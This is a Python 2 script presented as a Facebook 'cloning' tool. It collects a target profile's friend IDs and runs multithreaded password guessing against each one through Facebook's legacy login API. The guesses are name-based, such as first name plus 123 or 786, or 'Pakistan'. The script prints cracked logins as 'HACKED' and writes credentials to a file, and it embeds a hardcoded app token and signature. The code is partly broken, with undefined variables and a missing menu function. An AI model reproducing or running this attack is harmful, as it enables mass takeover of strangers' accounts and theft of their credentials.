#!/usr/bin/python2
#coding=utf-8
#TECH ABM THE OFFICAL ROGRAMMER 
#FBCLONING COMMMAD MAKER 
#YOUTUBE TECH ABM


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:TECH ABM
#### LOGO ####
logo = """

	   \033[1;47m \033[1;31m OWNER : MUJOO KHAN \033[1;0m     
 \033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗
 \033[1;95m║\033[1;92mCREATOR ║ \033[1;96m♤͜͡♤ MUJOO KHAN
 \033[1;95m║\033[1;92mFACEBOK ║ \033[1;96m♤͜͡♤ m.facebook.com/itz.MuJoo007
 \033[1;95m║\033[1;92mHELPING ║ \033[1;96m♤͜͡♤ ANY HELP CONTACT ME ON FACEBOOK 
 \033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝

 \033[1;94m⊱══════════════════⊱═⊰DISCLAIMER⊱═⊰══════════════════⊰
 \033[1;91mWARNING :\033[1;93mUSE A FRESH ACCOUNT IF YOU LOGIN WITH FACEBOOK, USE OLD ACCOUDNT IF YOU LOGIN WITH TOKEN.
 \033[1;91mWIFI OR MOBILE DATA :\033[1;93mONLY MOBILE DATA USE FOR CLONING , WIFI USER CONNECT ANY PROXY.
 \033[1;91mID NOT FOUND PROBLEM :\033[1;93mCOPY TO PROFILE PHOTO USERNAME AND THEN PASTE IN TERMUX.
 \033[1;91mMEHTOD LOGIN OLD ACCOUNT :\033[1;93mFIRST DOWNLOAD TOKEN APP AND OLD FACEBOOK ACCOUNT LOGIN IN TOKEN, YOU WILL SHOW CODE, COPY CODE AND TYPE 2 AND PASTE CODE AND LOGIN OLD ACCOUNT SUCCESSFULLY.
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """

         
	   \033[1;47m \033[1;31m OWNER : MUJOO KHAN \033[1;0m     
 \033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗
 \033[1;95m║\033[1;92mCREATOR ║ \033[1;96m♤͜͡♤ MUJOO KHAN
 \033[1;95m║\033[1;92mFACEBOK ║ \033[1;96m♤͜͡♤ m.facebook.com/itz.MuJoo007
 \033[1;95m║\033[1;92mHELPING ║ \033[1;96m♤͜͡♤ ANY HELP CONTACT ME ON FACEBOOK 
 \033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝
"""
jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
jalan('\033[1;91m      \033[1;91m ENTER MUJOO TOOL USERNAME AND PASSWORD \033[1;0m     ') 
jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 

CorrectUsername = "MUJOO"
CorrectPassword = "KHAN"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  #DEV FARIYA KHAN
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://m.facebook.com/itz.mujoo007')
    else:
        print "Wrong username!"
        os.system('xdg-open https://m.facebook.com/itz.mujoo007')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	
	os.system("clear")
	print logo
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"  ) 
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
	print "\033[1;32;98m[1] \033[1;96m>> start Cloning with Mujoo "																														
	print "\033[1;32;98m[0] \033[1;96m>> Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack From Public ID") 
	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰═══════════════════════════════════════⊱⋕⊰\n" 
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ❈"
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Fariya Khan
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED WITH FARIYA TOOL 100%'											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '12345'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED 100%'											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED 100%'							
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['last_name'] + '12345'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED 100%'											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '123456'										
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED 100%'						
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 '
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED 100%'											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['last_name']+'123456'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED WITH 100%'					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['first_name']+'786'									
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED 100%'											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['last_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHACKED WITH 100%'			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mID LOGIN AFTER 7 DAYS '
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)	
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()

